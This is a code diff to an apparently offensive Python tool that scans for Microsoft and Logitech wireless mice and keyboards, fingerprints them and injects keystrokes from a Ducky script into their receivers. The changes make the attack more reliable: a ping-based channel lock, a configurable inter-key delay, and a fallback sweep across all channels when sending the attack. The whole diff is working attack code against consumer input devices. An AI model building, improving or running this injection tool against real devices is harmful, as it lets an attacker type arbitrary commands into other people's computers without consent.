@@ -291,7 +291,6 @@ class NordicScanner(object):
                         self.devices[a]['timestamp'] = time.time()
                         if not self.channels[self.channel_index] in self.devices[a]['channels']:
                             self.devices[a]['channels'].append(self.channels[self.channel_index])
-                        # Updates the payload to the longest -- ignores packets len 20 or higher (AES keyboard)
                         if payload and self.fingerprint_device(payload):
                             self.devices[a]['device'] = self.fingerprint_device(payload)
                             self.devices[a]['payload'] = payload
@@ -308,8 +307,16 @@ class NordicScanner(object):
     def sniff(self, address):
         self.radio.enter_sniffer_mode(''.join(chr(b) for b in address[::-1]))
 
-    @staticmethod
-    def fingerprint_device(p):
+    def acquire_channel(self, address):
+        addr = ''.join(chr(b) for b in address[::-1])
+        self.radio.enter_sniffer_mode(addr)
+        for channel in range(2, 84):
+            self.radio.set_channel(channel)
+            if self.radio.transmit_payload(self.ping_payload, self.ack_timeout, self.retries):
+                return channel
+        return None
+
+    def fingerprint_device(self, p):
         if len(p) == 19 and (p[0] == 0x08 or p[0] == 0x0c) and p[6] == 0x40:
             # Most likely a non-XOR encrypted Microsoft mouse
             return MS_MOUSE
@@ -337,7 +344,7 @@ class NordicScanner(object):
 
 class MicrosoftHID(object):
 
-    def __init__(self, detect, radio, address, payload):
+    def __init__(self, detect, radio, address, payload, key_delay):
         self.radio = radio
         self.address = address
         self.string_address = self.hexify(address)
@@ -346,6 +353,7 @@ class MicrosoftHID(object):
         self.ack_timeout = 4
         self.retries = 15
         self.device_vendor = 'Microsoft'
+        self.key_delay = key_delay
 
         if detect == MS_MOUSE:
             self.device_type = 2
@@ -433,8 +441,7 @@ class MicrosoftHID(object):
             self.payload[7:18] = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
 
     def post_keystroke_delay(self):
-        if self.encrypted:
-            time.sleep(0.005)
+        time.sleep(self.key_delay / 1000.0)
 
     def send_key(self, c=None):
         if not c:
@@ -467,7 +474,7 @@ class MicrosoftHID(object):
 
 class LogitechHID(object):
 
-    def __init__(self, detect, radio, address, payload):
+    def __init__(self, detect, radio, address, payload, key_delay):
         self.radio = radio
         self.address = address
         self.string_address = self.hexify(address)
@@ -476,6 +483,7 @@ class LogitechHID(object):
         self.ack_timeout = 4
         self.retries = 15
         self.device_vendor = 'Logitech'
+        self.key_delay = key_delay
 
         if detect == LOG_MOUSE:
             self.device_type = 2
@@ -523,7 +531,7 @@ class LogitechHID(object):
         self.payload = [0, 0xC1, 0, 0, 0, 0, 0, 0, 0, 0]
 
     def post_keystroke_delay(self):
-        pass
+        time.sleep(self.key_delay / 1000.0)
 
     def send_key(self, c=None):
         if not c:
@@ -581,7 +589,8 @@ def confirmroot():
 @click.option('--script', default="", help="Ducky file to use for injection", type=click.Path())
 @click.option('--lowpower', is_flag=True, help="Disable LNA on CrazyPA")
 @click.option('--interval', default=5, help="Interval of scan in seconds, default to 5s")
-def cli(debug, script, lowpower, interval):
+@click.option('--keydelay', default=10, help="Inter-key delay in milliseconds")
+def cli(debug, script, lowpower, interval, keydelay):
 
     banner()
     confirmroot()
@@ -682,17 +691,25 @@ def cli(debug, script, lowpower, interval):
 
             scan.sniff(address)
             device = None
-            device_type = NordicScanner.fingerprint_device(payload)
+            device_type = scan.fingerprint_device(payload)
             if device_type == MS_MOUSE or device_type == MS_MOUSE_ENC or device_type == MS_KEYBOARD_ENC:
-                device = MicrosoftHID(device_type, radio, address, payload)
+                device = MicrosoftHID(device_type, radio, address, payload, keydelay)
             elif device_type == LOG_MOUSE or device_type == LOG_KEYBOARD:
-                device = LogitechHID(device_type, radio, address, payload)
+                device = LogitechHID(device_type, radio, address, payload, keydelay)
 
             if device:
-                for channel in channels:
-                    radio.set_channel(channel)
-                    print GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (scan.hexify(address), device.device_type, channel)
+                lock_channel = scan.acquire_channel(address)
+
+                if lock_channel:
+                    print GR + '[+] ' + W + 'Ping success on channel %d' % (lock_channel,)
+                    print GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (scan.hexify(address), device.device_type, lock_channel)
                     device.send_attack(attack)
+                else:
+                    print R + '[-] ' + W + 'Ping failed, trying all channels'
+                    for channel in channels:
+                        radio.set_channel(channel)
+                        print GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (scan.hexify(address), device.device_type, channel)
+                        device.send_attack(attack)
             else:
                 print R + '[-] ' + W + "Target %s is not injectable. Skipping..." % (scan.hexify(address))
                 continue
